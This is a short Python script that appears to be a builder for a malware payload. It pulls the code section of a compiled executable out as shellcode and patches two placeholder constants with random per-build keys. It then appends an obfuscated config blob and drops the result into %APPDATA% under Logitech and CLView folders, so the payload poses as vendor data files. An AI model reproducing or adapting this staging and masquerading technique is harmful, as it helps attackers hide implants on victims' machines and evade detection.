import pefile
import random
import os

final_path = '.\\x64\\Debug\\FinalTest.exe'
config_path = '.\\x64\\Debug\\logitech.cfg'
config_data = open(config_path, 'rb').read()

pe = pefile.PE(final_path)
for section in pe.sections:
    if section.Name == b'.text\x00\x00\x00':
        shellcode = section.get_data()
        key1 = random.randbytes(8)
        key2 = random.randbytes(8)
        for i in range(len(shellcode)):
            value = int.from_bytes(shellcode[i: i + 8], 'little')
            if value == 0x254b70d8fe6a904e:
                shellcode = shellcode[:i] + key1 + shellcode[i + 8:]
            elif value == 0x777733e22f9889c2:
                shellcode = shellcode[:i] + key2 + shellcode[i + 8:]
                break
        
        shellcode = shellcode + key1 + (len(config_data) ^ int.from_bytes(key1, 'little') ^ int.from_bytes(key2, 'little')).to_bytes(8, 'little') + config_data
        open(os.path.expandvars('%APPDATA%\\Logitech\\userdata.dat'), 'wb').write(shellcode)
        open(os.path.expandvars('%APPDATA%\\CLView\\db.dat'), 'wb').write(shellcode)
        break